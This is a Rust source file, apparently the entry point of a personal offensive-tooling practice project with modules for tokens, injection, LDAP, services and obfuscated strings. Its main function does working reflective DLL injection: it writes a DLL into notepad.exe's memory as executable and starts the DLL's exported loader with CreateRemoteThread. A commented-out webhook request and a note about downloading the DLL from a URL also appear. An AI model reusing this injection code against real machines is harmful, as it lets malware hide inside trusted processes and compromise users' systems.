

mod utils;
mod os;
mod processmanager;
mod peparser;
mod tokenmanager;
mod pipemanager;
mod sharemanager;
mod servicemanager;
mod registrymanager;
mod injectionmanager;
mod ldapmanager;
mod userinput;

use std::io::Read;
use std::net::Shutdown::Write;
use std::thread;
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAlloc, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::processthreadsapi::*;
use winapi::um::winnt::*;
use winapi::um::synchapi::*;
use winapi::ctypes::*;
use utils::parse_structure_from_memory;
use crate::os::getosversion;
use ntapi::ntpsapi::*;
use ntapi::ntmmapi::*;
use crate::peparser::Peparser64;
use crate::processmanager::enumeration::{get_process_info_by_name, get_processes, get_processes_from_createtoolhelp32snapshot, processchecker, processcheckerwithargs, readunicodestringfrommemory};
use crate::utils::{getclipboard, setclipboard, ReadStringFromMemory};
use winapi::um::winnt::*;
use winapi::shared::minwindef::*;
use winapi::um::libloaderapi::*;
use ntapi::ntpebteb::*;
use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winuser::*;
use winapi::um::synchapi::*;
use crate::pipemanager::pipes::*;
use winapi::um::securitybaseapi::*;

use winapi::um::winnt::*;
use winapi::ctypes::*;
use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi::*;
use winapi::um::handleapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use winapi::um::winbase::*;
use winapi::um::processthreadsapi::*;
use winapi::um::heapapi::*;

#[macro_use]
extern crate litcrypt;

use md5;
use winapi::um::fileapi::{CreateFileA, DeleteFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
use winapi::um::minwinbase::{OVERLAPPED, SECURITY_ATTRIBUTES};
use crate::tokenmanager::enumeration::*;
use crate::tokenmanager::sids::allocatesid;
use crate::tokenmanager::tokens::runme37;

use_litcrypt!();



use base64::*;
use ntapi::ntapi_base::{CLIENT_ID, PCLIENT_ID};
use ntapi::ntexapi::KUSER_SHARED_DATA;
use ntapi::ntobapi::NtClose;
use winapi::um::ktmw32::*;
use winapi::um::namedpipeapi::{*, CreatePipe};

#[no_mangle]
#[link_section = "text"]
static mut stub:[u8;23] = [0;23];




pub fn createpipe2(){

    let pipehandle = unsafe{CreateNamedPipeA(
        "\\\\.\\pipe\\myserverpipe69\0".as_bytes().as_ptr() as *const i8,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE,
        1,
        1024,
        1024,
        0,
        std::ptr::null_mut()
    )};

    if pipehandle==INVALID_HANDLE_VALUE{
        println!("CreateNamedPipeA failed: {}",unsafe{GetLastError()});
    }

    if pipehandle!=INVALID_HANDLE_VALUE{

        let res =  unsafe{ConnectNamedPipe(pipehandle,std::ptr::null_mut())};

        let buffer = "GIMME_FLAG"
            .bytes().collect::<Vec<u8>>();

        let mut byteswritten = 0;
        unsafe{WriteFile(pipehandle,
                         buffer.as_ptr() as *const c_void,
                         buffer.len() as u32,&mut byteswritten,
                         std::ptr::null_mut())};


        unsafe{DisconnectNamedPipe(pipehandle)};

    }



}


use crate::ldapmanager::ldapquery;

use std::arch::asm;
use ldap3::Ldap;

fn main() {


   // let client = reqwest::blocking::Client::new();
    //let res = client.get("https://webhook.site/be613f13-30c9-4496-8b1d-5bcf5bade033").send();

    /*let p = processmanager::enumeration::get_processes();

    for i in 0..p.len(){
        println!("Process name: {}",p[i].get_process_name());
        println!("Process ID: {}",p[i].get_process_id());
        println!();

    }*/


    // downloads dll from an url and injects into say notepad.exe
    // after injection, execute loader function()

    // first lets inject dll from disk

    // "E:\rust_practice\omnitrix\reflection\target\release\reflection.dll"

    let buffer = std::fs::read("E:\\rust_practice\\omnitrix\\reflection\\target\\release\\reflection.dll").unwrap();




    let p = get_processes();
    for i in 0..p.len(){
        if p[i].get_process_name().to_lowercase()=="notepad.exe"{

            let prochandle = unsafe{OpenProcess(PROCESS_ALL_ACCESS,0,p[i].get_process_id())};
            if !prochandle.is_null(){

                let remotebase = unsafe{VirtualAllocEx(prochandle,std::ptr::null_mut(),
                                      buffer.len() ,
                                      MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE

                )};



                if !remotebase.is_null(){

                    println!("Allocated at: {:x?}",remotebase);
                    unsafe{WriteProcessMemory(prochandle,remotebase,
                                              buffer.as_ptr() as LPVOID,
                    buffer.len() ,std::ptr::null_mut())};

                    let dll = peparser::Peparser64::parse_from_file_buffer(buffer.clone()).unwrap();


                    // we need to fetch address of myloader()
                    // and createremotethread() at that address
                    let exports = dll.get_exports().unwrap();
                    for (funcname,funcoffset) in exports{

                        if funcname.to_lowercase()=="myloader"{

                            // funcoffset is offset from the virtual address
                            // but the dll is in raw format. so we need to
                            // convert the rva offset to file offset
                            let funcaddress = dll.rvatofileoffset(funcoffset).unwrap() + remotebase as usize;
                            println!("found our function at: {:x?}",funcaddress);

                            // we can createremotethread()
                            let mut threadid = 0;
                            let threadhandle = unsafe{CreateRemoteThread(prochandle,
                            std::ptr::null_mut(),
                            0,std::mem::transmute( funcaddress),std::ptr::null_mut(),
                            0,&mut threadid)};

                            println!("getlast error: {}",unsafe{GetLastError()});
                            println!("threadid: {}",threadid);

                        }

                    }




                }


                unsafe{CloseHandle(prochandle)};

            }

        }
    }



}